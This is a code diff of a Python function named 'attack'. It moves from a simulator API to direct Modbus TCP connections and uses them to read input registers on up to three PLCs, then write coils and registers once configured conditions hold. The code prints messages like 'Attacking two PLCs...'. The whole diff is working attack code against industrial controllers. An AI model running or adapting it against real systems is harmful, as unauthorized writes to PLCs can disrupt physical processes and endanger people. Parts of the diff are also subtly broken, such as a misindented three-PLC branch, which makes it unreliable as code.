@@ -5,7 +5,7 @@ from pymodbus.client.sync import ModbusTcpClient
 
 def attack(ctx):  
 
-    def on_level_change_plc(value: int, address):
+    def on_level_change_plc(value, address):
 
         # Read from config.ini
         config = configparser.ConfigParser()
@@ -34,7 +34,7 @@ def attack(ctx):
                       
                 else:
                     # Trigger unchecked - only main conditions
-                            trigger_operation_plc(pckt_value, address)
+                    trigger_operation_plc(pckt_value, address)
 
         else:
             # Pckt number != loop
@@ -60,10 +60,10 @@ def attack(ctx):
                     # Trigger unchecked - only main conditions
                         trigger_operation_plc(pckt_value, address)
                 ct = ct + 1
-    
+
+
 
     def checkTrigger(address):
-        
         config = configparser.ConfigParser()
         config.read('config.ini')
 
@@ -72,6 +72,7 @@ def attack(ctx):
                 if param_name.startswith('condition'):
                     return True
         return False
+
     
     
     
@@ -90,38 +91,34 @@ def attack(ctx):
         elif(address == config.get('plc', 'plc3')):
             plc_choice = config.get('params', 'plc3_choice')
             sett = "plc3"
-         
-            
-        coil = []
-        reg = []
-        reg_d = []
                 
         # Extracting choices coils/registers
         choices_list = [choice.strip() for choice in plc_choice.split(',')]
         
-        #print(choices_list)
+        ip, port = address.split(':')
+
+        # Convert the port to an integer
+        port = int(port)
+
+        client = ModbusTcpClient(ip, port = port)
+        client.connect()
         
         for choice in choices_list:
             if choice.startswith('c'):
-                temp = ctx.register(sett, 'C', int(choice[-1]))
-                temp.write(p_val)
+                client.write_coil(int(choice[-1]), p_val, unit=1)
                 print(f"Writing on %QX0.{int(choice[-1])} - {sett}")
-            elif choice.startswith('r'):
-                temp = ctx.register(sett, 'H', int(choice[-1]))
-                temp.write(p_val)
-                print(f"Writing on %MX0.{int(choice[-1])} - {sett}")
             elif choice.startswith('m'):
-                temp = ctx.register(sett, 'H', int(choice[-1])+1024)
-                temp.write(p_val)
+                client.write_register(int(choice[-1])+1024, p_val, unit=1)
                 print(f"Writing on %MW0.{int(choice[-1])} - {sett}")
                 
-            
+        client.close()
                
         
         if p_val == 0:
             print('COMMAND OFF - Value wrote:', p_val)
         elif p_val == 1:
             print('COMMAND ON - Value wrote:', p_val)
+    
 
     
     def evaluate_conditions(config):
@@ -213,65 +210,56 @@ def attack(ctx):
         return all_conditions_true
     
     
-    
     # Read from config.ini
     config = configparser.ConfigParser()
     config.read('config.ini')
 
     plc_values = {}
+    values = []
 
     for plc_key in config['plc']:
         plc_values[plc_key] = config.get('plc', plc_key)
-    
-    #print(plc_values)  
+        # Split the combined string into IP and port
+        ip, port = plc_values[plc_key].split(':')
 
-    # Allocate all IW registers
-    if(len(plc_values)== 1):
-        plc_1_input_register = ctx.register('plc1', 'I', 0)
-    elif(len(plc_values)== 2):
-        plc_1_input_register = ctx.register('plc1', 'I', 0)
-        plc_2_input_register = ctx.register('plc2', 'I', 0)
-    else:
-        plc_1_input_register = ctx.register('plc1', 'I', 0)
-        plc_2_input_register = ctx.register('plc2', 'I', 0)
-        plc_3_input_register = ctx.register('plc3', 'I', 0)
+        # Convert the port to an integer
+        port = int(port)
+
+        client = ModbusTcpClient(ip, port = port)
+        client.connect()
+        result = client.read_input_registers(0, count=1, unit=1)
+        values.append(result.registers[0])
+        client.close()
+
 
     # PLC attack
     # ONE PLC selected
     if config.get('params', 'plc1_choice') != "" and (config.get('params', 'plc2_choice') == "" and config.get('params', 'plc3_choice') == ""):
         
         print("Attacking one plc...")
-        plc_1_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc1')))
+        on_level_change_plc(values[0], config.get('plc', 'plc1'))
         
 
     # TWO PLCs selected
-    if config.get('plc', 'plc1') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') == "":
-        print("Attacking two plcs...")
-
-        # Threads operations
-        thread1 = threading.Thread(target=plc_1_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc1'))))
-        thread2 = threading.Thread(target=plc_2_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc2'))))
-
+    if config.get('params', 'plc1_choice') != "" and config.get('params', 'plc2_choice') != "":
+        print("Attacking two PLCs...")
+        thread1 = threading.Thread(target=on_level_change_plc, args=(values[0], config.get('plc', 'plc1')))
+        thread2 = threading.Thread(target=on_level_change_plc, args=(values[1], config.get('plc', 'plc2')))
         thread1.start()
         thread2.start()
         thread1.join()
         thread2.join()
-
-    # THREE PLCs selected 
-    if config.get('plc', 'plc1') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') != "":
-        print("Attacking three plcs...")
-
-        # Threads operations
-        thread1 = threading.Thread(target=plc_1_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc1'))))
-        thread2 = threading.Thread(target=plc_2_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc2'))))
-        thread3 = threading.Thread(target=plc_3_input_register.start_polling(500, lambda value: on_level_change_plc(value, config.get('plc', 'plc3'))))
-
-        thread1.start()
-        thread2.start()
-        thread3.start()
-        thread1.join()
-        thread2.join()
-        thread3.join()
-
     
+    # THREE PLCs selected 
+        if config.get('plc', 'plc1') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') != "":
+            print("Attacking three plcs...")
+            thread1 = threading.Thread(target=on_level_change_plc, args=(values[0], config.get('plc', 'plc1')))
+            thread2 = threading.Thread(target=on_level_change_plc, args=(values[1], config.get('plc', 'plc2')))
+            thread3 = threading.Thread(target=on_level_change_plc, args=(values[2], config.get('plc', 'plc3')))
+            thread1.start()
+            thread2.start()
+            thread3.start()
+            thread1.join()
+            thread2.join()
+            thread3.join()
 
